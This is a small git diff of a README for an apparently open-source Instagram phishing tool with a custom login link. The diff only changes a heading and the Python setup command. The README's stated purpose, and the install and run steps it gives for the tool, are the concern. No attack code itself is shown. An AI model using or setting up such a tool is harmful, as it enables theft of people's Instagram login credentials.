@@ -3,7 +3,7 @@
 
 A phishing tool purely for instagram in which you can set custom login link!
 
-Usage:
+# Usage:
 
 *warning- pip should be of latest version*
 
@@ -13,7 +13,7 @@ cd Inxtagram
 
 pip install -r requirements.txt
 
-python setup.py
+python3 setup.py
 
 
 
